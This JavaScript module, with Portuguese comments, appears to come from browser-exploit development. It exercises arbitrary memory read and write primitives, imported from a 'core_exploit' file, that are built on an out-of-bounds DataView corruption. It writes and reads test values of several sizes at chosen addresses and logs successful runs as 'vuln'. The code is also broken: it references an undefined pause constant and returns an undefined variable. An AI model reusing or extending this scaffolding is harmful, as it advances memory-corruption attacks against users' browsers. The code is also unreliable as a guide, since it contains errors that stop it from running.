// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v27: Bloco com "Reset Explícito" do DV)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // Do core_exploit.mjs v27 (síncrona, reutiliza DV, restaura metadados)
    arb_write, // Do core_exploit.mjs v27
    oob_read_absolute, // Para operação de "reset explícito"
    oob_write_absolute // Para operação de "reset explícito"
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v27_BlockRW_ExplicitDVReset";

// === Constantes ===
const ADDR_A_V27 = new AdvancedInt64(0x00000D00, 0x00000000); // Endereço de referência
const VAL_A1_V27 = new AdvancedInt64(0x11223344, 0x55667788);
const VAL_A2_V27 = new AdvancedInt64(0x88776655, 0x44332211);

const BLOCK_ADDR_BASE_V27 = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VAL_1_V27 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VAL_2_V27 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VAL_3_V27 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_ADDRS_V27 = [BLOCK_ADDR_BASE_V27, BLOCK_ADDR_BASE_V27.add(8), BLOCK_ADDR_BASE_V27.add(16)];
const BLOCK_VALS_V27 = [BLOCK_VAL_1_V27, BLOCK_VAL_2_V27, BLOCK_VAL_3_V27];

const VAL_32_V27 = 0xDDDDDDDD;
const VAL_16_V27 = 0xEEEE;
const VAL_8_V27  = 0xFF;

const PAUSE_OP_V27 = 75;       // Pausa entre operações R/W no mesmo endereço
const PAUSE_TRANSITION_V27 = 150; // Pausa ao mudar o "contexto" do DV com o reset explícito

let testLog_v27 = [];

function recordResult_v27(step, address, operation, valueWritten, valueExpected, valueReadObj) {
    // ... (Função recordResult_v26 pode ser reutilizada, apenas renomeie para v27 ou use a mesma) ...
    // COPIE A VERSÃO CORRIGIDA DE recordResult_v26 AQUI
    let actualSuccess = false;
    const valueReadStr = isAdvancedInt64Object(valueReadObj) 
        ? valueReadObj.toString(true) 
        : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') 
        ? "N/A" 
        : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
    const valueWrittenStr = valueWritten 
        ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) 
        : "N/A";
    const addressStr = address ? address.toString(true) : "N/A";

    if (valueExpected === null || operation.toLowerCase().includes("write only") || operation.toLowerCase().includes("reset dv") || operation.toLowerCase().includes("disturb")) {
        actualSuccess = true; 
    } else if (isAdvancedInt64Object(valueExpected)) {
        actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') {
        actualSuccess = (valueExpected === valueReadObj);
    } else { actualSuccess = false; }
    
    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, 
                    valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
    testLog_v27.push(entry);
    const logType = actualSuccess ? "debug" : "error"; // Alterado para debug para sucesso
    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
    return actualSuccess;
}

// Função para explicitamente "resetar" o DV fazendo-o operar no oob_array_buffer_real
// Assumimos que arb_read/arb_write restauram o m_vector para o que foi lido de 0x68 (que é 0x0)
async function explicit_dv_reset(tag) {
    const FNAME_RESET = `${FNAME_MODULE_V28}.explicit_dv_reset`;
    logS3(`    ResetDV-${tag}: Forçando operação no oob_array_buffer[0]...`, 'debug', FNAME_RESET);
    try {
      if (isOOBReady()){ // Garante que oob_dataview_real e oob_array_buffer_real são válidos
        const temp_val = oob_read_absolute(0,1); // Lê do oob_array_buffer_real[0]
        oob_write_absolute(0, temp_val, 1);      // Escreve de volta
        logS3(`        ResetDV-${tag}: Operação em oob_array_buffer[0] concluída.`, 'debug', FNAME_RESET);
      } else {
        logS3(`        ResetDV-${tag}: Ambiente OOB não pronto, pulando reset explícito.`, 'warn', FNAME_RESET);
      }
    } catch (e) {
        logS3(`        ResetDV-${tag}: ERRO durante o reset explícito: ${e.message}`, 'error', FNAME_RESET);
    }
    await PAUSE_S3(PAUSE_TRANSITION_V27);
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBlockRWWithExplicitDVReset`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Bloco com Reset Explícito do DV (v27) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v27 = [];

    let errorCapturedMain = null;
    let overall_test_success = true;
    let final_message = "Todos os cenários executados.";

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // --- CENÁRIO 1: Teste de Linha de Base (ADDR_A_V27) ---
        logS3("--- CENÁRIO 1: R/W Sequencial no MESMO endereço (ADDR_A_V27) ---", "subtest", FNAME_CURRENT_TEST);
        arb_write(ADDR_A_V27, VAL_A1_V27, 8); 
        if(!recordResult_v27("1.1", ADDR_A_V27, "Write/Read VAL_A1", VAL_A1_V27, VAL_A1_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
        await explicit_dv_reset("1_A");
        arb_write(ADDR_A_V27, VAL_A2_V27, 8); 
        if(!recordResult_v27("1.2", ADDR_A_V27, "Write/Read VAL_A2", VAL_A2_V27, VAL_A2_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
        await explicit_dv_reset("1_B");
        if(!recordResult_v27("1.3", ADDR_A_V27, "Read Final VAL_A2", null, VAL_A2_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;

        // --- CENÁRIO 2: R/W em Bloco com Reset Explícito do DV ---
        logS3("--- CENÁRIO 2: R/W em Bloco com Reset Explícito do DV ---", "subtest", FNAME_CURRENT_TEST);
        // Fase de Escrita do Bloco
        for (let i = 0; i < BLOCK_ADDRS_V27.length; i++) {
            const current_address = BLOCK_ADDRS_V27[i];
            const value_to_write = BLOCK_VALS_V27[i];
            logS3(`  C2.Write.${i}: Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)}`, 'info', FNAME_CURRENT_TEST);
            arb_write(current_address, value_to_write, 8);
            // Leitura imediata para verificar
            if(!recordResult_v27(`C2.WriteRead.${i}`, current_address, `Write/Read Bloco Val ${i}`, value_to_write, value_to_write, arb_read(current_address, 8))) overall_test_success = false;
            await explicit_dv_reset(`PostWrite-${i}`); // Reset explícito após operar no endereço do bloco
        }
        
        logS3("  C2: Pausa MUITO Longa (" + PAUSE_VERY_LONG_V26 + "ms) antes da leitura final do bloco...", "warn", FNAME_CURRENT_TEST);
        await PAUSE_S3(PAUSE_VERY_LONG_V26); // PAUSE_VERY_LONG_V26 é do script v26, precisa definir ou usar PAUSE_LONG_V27

        // Fase de Leitura do Bloco (Verificação Final)
        logS3("  C2: Lendo o bloco para verificação final...", "info", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V27.length; i++) {
            const current_address = BLOCK_ADDRS_V27[i];
            const expected_value = BLOCK_VALS_V27[i];
            await explicit_dv_reset(`PreRead-${i}`); // Reset explícito ANTES de ler o endereço do bloco
            if(!recordResult_v27(`C2.FinalRead.${i}`, current_address, `Read Final Bloco Val ${i}`, null, expected_value, arb_read(current_address, 8))) overall_test_success = false;
        }

        // CENÁRIO 3 Simplificado para focar na L/E de diferentes tamanhos sem a complexa verificação consolidada
        logS3("--- CENÁRIO 3: R/W Diferentes Tamanhos (ADDR_A_V27) ---", "subtest", FNAME_CURRENT_TEST);
        await explicit_dv_reset("Pre-C3");
        arb_write(ADDR_A_V27, VAL_A1_V27, 8); 
        if(!recordResult_v27("3.1", ADDR_A_V27, "Write/Read VAL_A1_V27 (64b)", VAL_A1_V27, VAL_A1_V27, arb_read(ADDR_A_V27, 8))) overall_test_success = false;
        
        await explicit_dv_reset("Post-3.1");
        arb_write(ADDR_A_V27, VAL_32_V27, 4); 
        if(!recordResult_v27("3.2", ADDR_A_V27, "Write/Read VAL_32_V27 (32b)", VAL_32_V27, VAL_32_V27, arb_read(ADDR_A_V27, 4))) overall_test_success = false;
        
        await explicit_dv_reset("Post-3.2");
        // Verifica se a parte alta de VAL_A1_V27 foi preservada
        const high_part_val_a1_read = arb_read(ADDR_A_V27.add(4), 4);
        if(!recordResult_v27("3.3", ADDR_A_V27.add(4), "Read High Part of VAL_A1_V27 (32b)", null, VAL_A1_V27.high(), high_part_val_a1_read )) overall_test_success = false;

        await explicit_dv_reset("Post-3.3");
        arb_write(ADDR_A_V27, VAL_16_V27, 2); 
        if(!recordResult_v27("3.4", ADDR_A_V27, "Write/Read VAL_16_V27 (16b)", VAL_16_V27, VAL_16_V27, arb_read(ADDR_A_V27, 2))) overall_test_success = false;

        await explicit_dv_reset("Post-3.4");
        arb_write(ADDR_A_V27, VAL_8_V27, 1);  
        if(!recordResult_v27("3.5", ADDR_A_V27, "Write/Read VAL_8_V27 (8b)", VAL_8_V27, VAL_8_V27, arb_read(ADDR_A_V27, 1))) overall_test_success = false;

        // Verificação final consolidada do byte 0 após todas as escritas parciais
        await explicit_dv_reset("Post-3.5");
        const final_byte0_read = arb_read(ADDR_A_V27, 1);
        if(!recordResult_v27("3.6", ADDR_A_V27, "Read Final Byte0 de ADDR_A_V27", null, VAL_8_V27, final_byte0_read)) overall_test_success = false;


        if (testLog_v27.every(r => r.success)) {
            overall_test_success = true; // Define apenas se TUDO passou
            final_message = "SUCESSO GERAL: Todos os passos individuais dos cenários de teste (v27) passaram.";
        } else {
            overall_test_success = false;
            final_message = "FALHA PARCIAL: Um ou mais passos individuais nos cenários de teste (v27) falharam.";
        }
        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "V27 OK" : "V27 FALHA"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Testes com Reset Explícito DV (v27): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v27.forEach(res => {
            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
        });
    }
    return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v27 };
}
